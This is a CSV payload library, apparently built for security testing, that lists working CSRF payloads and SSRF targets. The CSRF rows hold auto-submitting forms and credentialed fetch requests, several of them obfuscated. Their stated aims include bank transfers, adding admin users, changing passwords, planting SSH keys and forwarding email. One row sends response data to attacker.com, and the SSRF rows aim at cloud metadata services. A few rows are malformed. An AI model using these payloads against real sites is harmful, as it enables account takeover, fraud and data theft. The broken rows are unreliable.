id,description,payload,context,type,severity,example_query,example_usage
csrf-022,CSRF using fetch with chained promises to exfiltrate response,"<script>fetch('https://target.com/api/update',{method:'POST',credentials:'include',body:'setting=evil'}).then(r=>r.text()).then(t=>fetch('https://attacker.com/log?data='+encodeURIComponent(t)));</script>",Malicious webpage,CSRF,critical,,
csrf-023,CSRF using form with multiple hidden inputs and auto-submit,<form action='https://target.com/api/settings' method='POST' id='f'><input type='hidden' name='mode' value='stealth'/><input type='hidden' name='level' value='admin'/></form><script>document.getElementById('f').submit();</script>,Malicious webpage,CSRF,high,,
csrf-024,CSRF using image with onload event triggering XMLHttpRequest,"<img src='https://target.com/api/trigger' onload=""var xhr=new XMLHttpRequest();xhr.open('POST','https://target.com/api/confirm',true);xhr.withCredentials=true;xhr.send('confirm=yes');"">",Malicious webpage,CSRF,high,,
csrf-025,CSRF using SVG with embedded script to submit form,<svg><script>var f=document.createElement('form');f.action='https://target.com/api/delete';f.method='POST';document.body.appendChild(f);f.submit();</script></svg>,Malicious webpage,CSRF,critical,,
csrf-026,CSRF using beacon API with custom payload,"<script>navigator.sendBeacon('https://target.com/api/track','action=steal');</script>",Malicious webpage,CSRF,medium,,
csrf-027,CSRF using form with enctype multipart/form-data and auto-submit,<form action='https://target.com/api/upload' method='POST' enctype='multipart/form-data' id='f'><input type='file' name='file'/></form><script>document.getElementById('f').submit();</script>,Malicious webpage,CSRF,medium,,
csrf-028,CSRF using iframe with srcdoc containing auto-submitting form,"<iframe style='display:none' srcdoc=""<form action='https://target.com/api/modify' method='POST' id='f'><input name='param' value='evil'/></form><script>document.getElementById('f').submit();</script>""></iframe>",Malicious webpage,CSRF,high,,
csrf-029,CSRF using script with setTimeout to chain multiple requests,"<script>setTimeout(()=>fetch('https://target.com/api/step1',{method:'POST',credentials:'include'}),1000);setTimeout(()=>fetch('https://target.com/api/step2',{method:'POST',credentials:'include'}),3000);</script>",Malicious webpage,CSRF,high,,
csrf-030,CSRF using form with target iframe and hidden inputs,<iframe name='hidden' style='display:none'></iframe><form action='https://target.com/api/settings' method='POST' target='hidden' id='f'><input name='mode' value='stealth'/></form><script>document.getElementById('f').submit();</script>,Malicious webpage,CSRF,high,,
csrf-031,CSRF using fetch with spoofed headers (may bypass naive CSRF tokens),"<script>fetch('https://target.com/api/update',{method:'POST',credentials:'include',headers:{'X-CSRF-Token':'fake'},body:'data=evil'});</script>",Malicious webpage,CSRF,high,,
csrf-032,CSRF using form with onsubmit event modifying data,"<form action='https://target.com/api/submit' method='POST' onsubmit='this.data.value=""hacked""'><input name='data' value='original'/></form><script>document.forms[0].submit();</script>",Malicious webpage,CSRF,high,,
csrf-033,CSRF using image with onerror event triggering fetch,"<img src='invalid.jpg' onerror=""fetch('https://target.com/api/like',{method:'POST',credentials:'include',body:'post=123'});"">",Malicious webpage,CSRF,high,,
csrf-034,CSRF using meta refresh to redirect to GET endpoint,<meta http-equiv='refresh' content='0;url=https://target.com/api/subscribe?plan=premium'/>,Malicious webpage,CSRF,medium,,
csrf-035,CSRF using script to create and submit form dynamically,<script>var f=document.createElement('form');f.action='https://target.com/api/delete';f.method='POST';document.body.appendChild(f);f.submit();</script>,Malicious webpage,CSRF,critical,,
csrf-036,CSRF using fetch with JSON payload (if API accepts),"<script>fetch('https://target.com/api/json',{method:'POST',credentials:'include',headers:{'Content-Type':'application/json'},body:JSON.stringify({action:'delete'})});</script>",Malicious webpage,CSRF,high,,
csrf-037,CSRF using form with multiple steps and chained submissions,"<form action='https://target.com/api/step1' method='POST' id='f1'><input name='step' value='1'/></form><form action='https://target.com/api/step2' method='POST' id='f2'><input name='step' value='2'/></form><script>document.getElementById('f1').submit();setTimeout(()=>document.getElementById('f2').submit(),2000);</script>",Malicious webpage,CSRF,high,,
csrf-038,CSRF using iframe with srcdoc and script to submit form,"<iframe style='display:none' srcdoc=""<form action='https://target.com/api/modify' method='POST' id='f'><input name='param' value='evil'/></form><script>document.getElementById('f').submit();</script>""></iframe>",Malicious webpage,CSRF,high,,
csrf-039,"CSRF using script with asyncawait fetch('https://target.com/api/async',{method:'POST',credentials:'include',body:'action=async'});</script>",,Malicious webpage,CSRF,high,,
csrf-040,CSRF using form with hidden iframe and delayed submission,"<iframe name='hiddenFrame' style='display:none'></iframe><form action='https://target.com/api/hidden' method='POST' target='hiddenFrame' id='f'><input name='secret' value='data'/></form><script>setTimeout(()=>document.getElementById('f').submit(),1500);</script>",Malicious webpage,CSRF,high,,
csrf-041,CSRF using script to create image with onload triggering fetch,"<script>var img=new Image();img.onload=function(){fetch('https://target.com/api/action',{method:'POST',credentials:'include'});};img.src='https://target.com/api/trigger';</script>",Malicious webpage,CSRF,high,,
csrf-042,CSRF using form with multiple hidden inputs and chained submission,"<form action='https://target.com/api/first' method='POST' id='f1'><input type='hidden' name='step' value='1'/></form><form action='https://target.com/api/second' method='POST' id='f2'><input type='hidden' name='step' value='2'/></form><script>document.getElementById('f1').submit();setTimeout(()=>document.getElementById('f2').submit(),2500);</script>",Malicious webpage,CSRF,high,,
csrf-043,CSRF using fetch with custom headers and JSON body,"<script>fetch('https://target.com/api/custom',{method:'POST',credentials:'include',headers:{'Content-Type':'application/json','X-Requested-With':'XMLHttpRequest'},body:JSON.stringify({cmd:'run'})});</script>",Malicious webpage,CSRF,high,,
csrf-044,CSRF using form with onsubmit event to modify hidden input,"<form action='https://target.com/api/modify' method='POST' onsubmit='this.token.value=""hacked""'><input type='hidden' name='token' value='original'/></form><script>document.forms[0].submit();</script>",Malicious webpage,CSRF,high,,
csrf-045,CSRF using image with onerror event to trigger XMLHttpRequest,"<img src='nonexistent.jpg' onerror=""var xhr=new XMLHttpRequest();xhr.open('POST','https://target.com/api/like',true);xhr.withCredentials=true;xhr.send('post=999');"">",Malicious webpage,CSRF,high,,
csrf-046,CSRF using meta refresh to redirect to sensitive GET endpoint,<meta http-equiv='refresh' content='0;url=https://target.com/api/subscribe?plan=vip'/>,Malicious webpage,CSRF,medium,,
csrf-047,CSRF using script to dynamically create and submit form with delay,"<script>setTimeout(()=>{var f=document.createElement('form');f.action='https://target.com/api/delete';f.method='POST';document.body.appendChild(f);f.submit();},2000);</script>",Malicious webpage,CSRF,critical,,
csrf-048,CSRF using fetch with JSON body and credentials,"<script>fetch('https://target.com/api/json',{method:'POST',credentials:'include',headers:{'Content-Type':'application/json'},body:JSON.stringify({delete:true})});</script>",Malicious webpage,CSRF,high,,
csrf-049,CSRF using chained form submissions with timeouts,"<form action='https://target.com/api/step1' method='POST' id='f1'><input name='step' value='1'/></form><form action='https://target.com/api/step2' method='POST' id='f2'><input name='step' value='2'/></form><script>document.getElementById('f1').submit();setTimeout(()=>document.getElementById('f2').submit(),3000);</script>",Malicious webpage,CSRF,high,,
csrf-051,CSRF to add admin user via hidden form,<form action='https://example.com/admin/add-user' method='POST' id='f'><input name='username' value='eviladmin'/><input name='role' value='admin'/></form><script>document.getElementById('f').submit();</script>,Admin panel user management,CSRF,critical,,
csrf-052,CSRF to change email notification settings,<form action='https://mail.example.com/settings/notifications' method='POST' id='f'><input name='email_alerts' value='off'/></form><script>document.getElementById('f').submit();</script>,Email service user settings,CSRF,medium,,
csrf-053,CSRF to reset 2FA via GET request,<img src='https://secure.example.com/2fa/reset?user=target' style='display:none'/>,Security 2FA reset endpoint,CSRF,high,,
csrf-054,CSRF to subscribe victim to premium service,<meta http-equiv='refresh' content='0;url=https://streaming.example.com/subscribe?plan=premium'/>,Streaming service subscription,CSRF,medium,,
csrf-055,CSRF to change victim's shipping address,<form action='https://shop.example.com/account/address' method='POST' id='f'><input name='address' value='123 Evil St'/></form><script>document.getElementById('f').submit();</script>,E-commerce user profile,CSRF,high,,
csrf-056,CSRF to add attacker as friend,<form action='https://social.example.com/friends/add' method='POST' id='f'><input name='friend_id' value='attacker'/></form><script>document.getElementById('f').submit();</script>,Social media friend management,CSRF,medium,,
csrf-057,CSRF to post malicious comment,<form action='https://blog.example.com/comments' method='POST' id='f'><input name='post_id' value='123'/><textarea name='comment'>Hacked by attacker</textarea></form><script>document.getElementById('f').submit();</script>,Blog comment submission,CSRF,medium,,
csrf-058,CSRF to change victim's profile picture,<form action='https://social.example.com/profile/picture' method='POST' enctype='multipart/form-data' id='f'><input type='file' name='avatar' value='evil.jpg'/></form><script>document.getElementById('f').submit();</script>,Social media profile update,CSRF,medium,,
csrf-059,CSRF to initiate money transfer,<form action='https://bank.example.com/transfer' method='POST' id='f'><input name='amount' value='10000'/><input name='to_account' value='attacker'/></form><script>document.getElementById('f').submit();</script>,Online banking transfer,CSRF,critical,,
csrf-060,CSRF to disable security alerts,<form action='https://security.example.com/settings' method='POST' id='f'><input name='alerts' value='off'/></form><script>document.getElementById('f').submit();</script>,Security settings,CSRF,high,,
csrf-061,CSRF to change victim's password,<form action='https://example.com/account/change-password' method='POST' id='f'><input name='new_password' value='P@ssw0rdHacked'/></form><script>document.getElementById('f').submit();</script>,User account management,CSRF,critical,,
csrf-062,CSRF to add malicious webhook URL,<form action='https://ci.example.com/settings/webhooks' method='POST' id='f'><input name='url' value='https://attacker.com/hook'/></form><script>document.getElementById('f').submit();</script>,Continuous Integration webhook settings,CSRF,high,,
csrf-063,CSRF to change victim's timezone,<form action='https://calendar.example.com/settings' method='POST' id='f'><input name='timezone' value='UTC+14'/></form><script>document.getElementById('f').submit();</script>,Calendar application settings,CSRF,low,,
csrf-064,CSRF to enable auto-forwarding of emails,<form action='https://mail.example.com/settings/forwarding' method='POST' id='f'><input name='forward_to' value='attacker@example.com'/></form><script>document.getElementById('f').submit();</script>,Email forwarding settings,CSRF,high,,
csrf-065,CSRF to add malicious SSH key,<form action='https://git.example.com/account/keys' method='POST' id='f'><textarea name='key'>ssh-rsa AAAAB3NzaC1yc2EAAAABIwAAAQEA...</textarea></form><script>document.getElementById('f').submit();</script>,Git hosting service SSH keys,CSRF,critical,,
csrf-066,CSRF to change victim's language preference,<form action='https://example.com/settings/language' method='POST' id='f'><input name='lang' value='xx-XX'/></form><script>document.getElementById('f').submit();</script>,User interface settings,CSRF,low,,
csrf-067,CSRF to add victim to attacker's mailing list,<form action='https://newsletter.example.com/subscribe' method='POST' id='f'><input name='email' value='victim@example.com'/></form><script>document.getElementById('f').submit();</script>,Newsletter subscription,CSRF,low,,
csrf-068,CSRF to post malicious tweet,<form action='https://twitter.com/i/tweet/create' method='POST' id='f'><textarea name='tweet'>Hacked by attacker</textarea></form><script>document.getElementById('f').submit();</script>,Social media posting,CSRF,medium,,
csrf-069,CSRF to add victim's phone number to spam list,<form action='https://sms.example.com/spam/add' method='POST' id='f'><input name='phone' value='+1234567890'/></form><script>document.getElementById('f').submit();</script>,SMS spam management,CSRF,medium,,
csrf-070,CSRF to change victim's default payment method,<form action='https://payments.example.com/account/payment-method' method='POST' id='f'><input name='card_number' value='4111111111111111'/><input name='expiry' value='12/30'/></form><script>document.getElementById('f').submit();</script>,Payment gateway account settings,CSRF,high,,
csrf-071,CSRF to enable auto-approve on code reviews,<form action='https://code.example.com/reviews/settings' method='POST' id='f'><input name='auto_approve' value='true'/></form><script>document.getElementById('f').submit();</script>,Code review platform settings,CSRF,high,,
csrf-072,CSRF to add victim's device to attacker's monitoring,<form action='https://iot.example.com/devices/add' method='POST' id='f'><input name='device_id' value='attacker_device'/></form><script>document.getElementById('f').submit();</script>,IoT device management,CSRF,high,,
csrf-073,CSRF to change victim's calendar event,<form action='https://calendar.example.com/events/edit' method='POST' id='f'><input name='event_id' value='123'/><input name='title' value='Hacked Event'/></form><script>document.getElementById('f').submit();</script>,Calendar event management,CSRF,medium,,
csrf-074,CSRF to add victim's IP to blacklist,<form action='https://firewall.example.com/blacklist/add' method='POST' id='f'><input name='ip' value='victim_ip'/></form><script>document.getElementById('f').submit();</script>,Firewall management,CSRF,high,,
csrf-075,CSRF to change victim's DNS settings,<form action='https://dns.example.com/settings' method='POST' id='f'><input name='dns_server' value='8.8.8.8'/></form><script>document.getElementById('f').submit();</script>,DNS management,CSRF,high,,
csrf-076,CSRF to add victim to attacker's mailing list,<form action='https://mailinglist.example.com/subscribe' method='POST' id='f'><input name='email' value='victim@example.com'/></form><script>document.getElementById('f').submit();</script>,Mailing list subscription,CSRF,low,,
csrf-077,CSRF to change victim's profile bio,<form action='https://social.example.com/profile/bio' method='POST' id='f'><textarea name='bio'>Hacked by attacker</textarea></form><script>document.getElementById('f').submit();</script>,Social media profile,CSRF,medium,,
csrf-078,CSRF to add victim's phone number to spam list,<form action='https://sms.example.com/spam/add' method='POST' id='f'><input name='phone' value='+1234567890'/></form><script>document.getElementById('f').submit();</script>,SMS spam management,CSRF,medium,,
csrf-079,CSRF to change victim's notification preferences,<form action='https://app.example.com/settings/notifications' method='POST' id='f'><input name='push_notifications' value='off'/></form><script>document.getElementById('f').submit();</script>,App notification settings,CSRF,medium,,
csrf-081,CSRF with base64 encoded form and dynamic decoding,<script>var b='PGZvcm0gYWN0aW9uPSdodHRwczovL3RhcmdldC5jb20vYWN0aW9uL3VwZGF0ZScgbWV0aG9kPSdQT1NUJz48aW5wdXQgbmFtZT0nZGF0YScgdmFsdWU9J2V2aWwnPjwvaW5wdXQ+PC9mb3JtPg==';var d=atob(b);var f=document.createElement('div');f.innerHTML=d;document.body.appendChild(f);f.firstChild.submit();</script>,Dynamic base64 decoded form submission,CSRF,high,,
csrf-082,CSRF with hex encoded script and eval,<script>eval(unescape('%66%6f%72%6d%20%3d%20%64%6f%63%75%6d%65%6e%74%2e%63%72%65%61%74%65%45%6c%65%6d%65%6e%74%28%27%66%6f%72%6d%27%29%3b%66%6f%72%6d%2e%61%63%74%69%6f%6e%20%3d%20%27%68%74%74%70%73%3a%2f%2f%74%61%72%67%65%74%2e%63%6f%6d%2f%75%70%64%61%74%65%27%3b%66%6f%72%6d%2e%6d%65%74%68%6f%64%20%3d%20%27%50%4f%53%54%27%3b%76%61%72%20%69%6e%70%75%74%20%3d%20%64%6f%63%75%6d%65%6e%74%2e%63%72%65%61%74%65%45%6c%65%6d%65%6e%74%28%27%69%6e%70%75%74%27%29%3b%69%6e%70%75%74%2e%6e%61%6d%65%20%3d%20%27%64%61%74%61%27%3b%69%6e%70%75%74%2e%76%61%6c%75%65%20%3d%20%27%65%76%69%6c%27%3b%66%6f%72%6d%2e%61%70%70%65%6e%64%43%68%69%6c%64%28%69%6e%70%75%74%29%3b%64%6f%63%75%6d%65%6e%74%2e%62%6f%64%79%2e%61%70%70%65%6e%64%43%68%69%6c%64%28%66%6f%72%6d%29%3b%66%6f%72%6d%2e%73%75%62%6d%69%74%28%29%3b'));</script>,Hex encoded script with eval,CSRF,high,,
csrf-083,CSRF with dynamically created iframe and delayed form submission,"<script>var i=document.createElement('iframe');i.style.display='none';document.body.appendChild(i);var d=i.contentDocument||i.contentWindow.document;d.open();d.write('<form action=""https://target.com/api/transfer"" method=""POST"" id=""f""><input name=""amount"" value=""1000""/></form><script>document.getElementById(\'f\').submit();<\/script>');d.close();</script>",Dynamic iframe with form,CSRF,high,,
csrf-084,CSRF with obfuscated string concatenation,<script>var a='ht';var b='tps://';var c='target';var d='.com';var e='/api/evil';var f=document.createElement('form');f.action=a+b+c+d+e;f.method='POST';var i=document.createElement('input');i.name='cmd';i.value='run';f.appendChild(i);document.body.appendChild(f);f.submit();</script>,String concatenation obfuscation,CSRF,high,,
csrf-085,CSRF with event-triggered form submission on mouseover,"<form action='https://target.com/api/settings' method='POST' id='f'><input name='mode' value='stealth'/></form><div onmouseover='document.getElementById(""f"").submit()'>Hover me</div>",User interaction triggered CSRF,CSRF,medium,,
csrf-086,CSRF with delayed execution using setTimeout and obfuscated function,"<script>setTimeout(function(){var f=document.createElement('form');f.action='https://target.com/api/delete';f.method='POST';document.body.appendChild(f);f.submit();},3000);</script>",Delayed form submission,CSRF,high,,
csrf-087,CSRF with encoded URI components and dynamic decoding,<script>var p=decodeURIComponent('%66%6f%72%6d');var f=document.createElement(p);f.action='https://target.com/api/update';f.method='POST';var i=document.createElement('input');i.name='data';i.value='evil';f.appendChild(i);document.body.appendChild(f);f.submit();</script>,Encoded element creation,CSRF,high,,
csrf-088,CSRF with stealth iframe and form submission via postMessage,"<iframe id='f' style='display:none'></iframe><script>var i=document.getElementById('f');i.src='about:blank';i.onload=function(){var d=i.contentDocument||i.contentWindow.document;d.open();d.write('<form action=""https://target.com/api/steal"" method=""POST"" id=""form""><input name=""data"" value=""evil""/></form>');d.close();d.getElementById('form').submit();};</script>",Stealth iframe with postMessage,CSRF,critical,,
csrf-089,CSRF with obfuscated script using string split and join,<script>var s='ht'+'tp'+'s:'+'//ta'+'rget.com/api/evil';var f=document.createElement('form');f.action=s;f.method='POST';var i=document.createElement('input');i.name='cmd';i.value='run';f.appendChild(i);document.body.appendChild(f);f.submit();</script>,String split and join obfuscation,CSRF,high,,
csrf-090,CSRF with script tag injection via innerHTML,"<div id='container'></div><script>document.getElementById('container').innerHTML='<form action=""https://target.com/api/hack"" method=""POST"" id=""f""><input name=""data"" value=""evil""/></form><script>document.getElementById(\'f\').submit();<\/script>';</script>",Script injection via innerHTML,CSRF,critical,,
csrf-091,CSRF with obfuscated base64 and eval,<script>eval(atob('dmFyIGY9ZG9jdW1lbnQuYWxlbWVudC5jcmVhdGVFbGVtZW50KCdmb3JtJyk7IGYuYWN0aW9uID0naHR0cHM6Ly90YXJnZXQuY29tL2FwaS9leGl0JztmLm1ldGhvZCA9J1BPU1QnOyB2YXIgaSA9IGRvY3VtZW50LmNyZWF0ZUVsZW1lbnQoJ2lucHV0Jyk7IGku bmFtZSA9J2RhdGEnOyBpLnZhbHVlID0nZXZpbCc7IGYucGFzc0NoaWxkKGlpKTsgZG9jdW1lbnQuYm9keS5hcHBlbmRDaGlsZChmKTsgZi5zdWJtaXQoKTs='));</script>,Base64 encoded eval obfuscation,CSRF,critical,,
csrf-092,CSRF with SVG image and embedded script,"<svg xmlns='http://www.w3.org/2000/svg'><script><![CDATA[fetch('https://target.com/api/evil',{method:'POST',body:'data=evil'})]]></script></svg>",SVG embedded script,CSRF,high,,
csrf-093,CSRF with meta refresh and URL encoded payload,<meta http-equiv='refresh' content='0;url=https%3A%2F%2Ftarget.com%2Fapi%2Fupdate%3Fdata%3Devil'/>,Meta refresh with URL encoding,CSRF,medium,,
csrf-094,CSRF with JavaScript URL and obfuscated payload,"<a href=""javascript:(function(){var f=document.createElement('form');f.action='https://target.com/api/evil';f.method='POST';var i=document.createElement('input');i.name='cmd';i.value='run';f.appendChild(i);document.body.appendChild(f);f.submit();})()"">Click me</a>",JavaScript URL with obfuscation,CSRF,high,,
csrf-095,CSRF with hidden image and onerror event,"<img src='invalid.jpg' onerror=""var f=document.createElement('form');f.action='https://target.com/api/evil';f.method='POST';var i=document.createElement('input');i.name='data';i.value='evil';f.appendChild(i);document.body.appendChild(f);f.submit();"" style='display:none'/>",Image onerror event trigger,CSRF,high,,
csrf-096,CSRF with obfuscated Unicode escapes,<script>var a=\u0064\u006f\u0063\u0075\u006d\u0065\u006e\u0074;var f=document.createElement('form');f.action='https://target.com/api/evil';f.method='POST';var i=document.createElement('input');i.name='cmd';i.value='run';f.appendChild(i);document.body.appendChild(f);f.submit();</script>,Unicode escape obfuscation,CSRF,high,,
csrf-097,CSRF with CSS expression to trigger script,"<div style=""width:expression((function(){var f=document.createElement('form');f.action='https://target.com/api/evil';f.method='POST';var i=document.createElement('input');i.name='cmd';i.value='run';f.appendChild(i);document.body.appendChild(f);f.submit();})())""></div>",CSS expression injection,CSRF,high,,
csrf-098,CSRF with XMLHttpRequest and obfuscated URL,"<script>var xhr=new XMLHttpRequest();var u='https://target.com/api/evil';xhr.open('POST',u,true);xhr.setRequestHeader('Content-Type','application/x-www-form-urlencoded');xhr.send('data=evil');</script>",XHR POST request,CSRF,critical,,
csrf-099,CSRF with form submission triggered by CSS animation,<style>@keyframes x{from{opacity:0}to{opacity:1}}</style><form action='https://target.com/api/evil' method='POST' id='f' style='animation:x 1s forwards' onanimationend='this.submit()'><input name='data' value='evil'/></form>,CSS animation event trigger,CSRF,medium,,
ssrf-001,Basic SSRF to internal IP,http://127.0.0.1/,Access internal localhost service,SSRF,high,,
ssrf-002,SSRF to internal private IP range,http://192.168.1.1/,Access internal network device,SSRF,high,,
ssrf-003,SSRF to metadata service on AWS,http://169.254.169.254/latest/meta-data/,AWS EC2 instance metadata,SSRF,critical,,
ssrf-004,SSRF to GCP metadata service,http://metadata.google.internal/computeMetadata/v1/,Google Cloud metadata,SSRF,critical,,
ssrf-005,SSRF to Azure instance metadata,http://169.254.169.254/metadata/instance?api-version=2021-02-01,Azure VM metadata,SSRF,critical,,
ssrf-006,SSRF to internal Redis service,redis://127.0.0.1:6379,Access internal Redis,SSRF,high,,
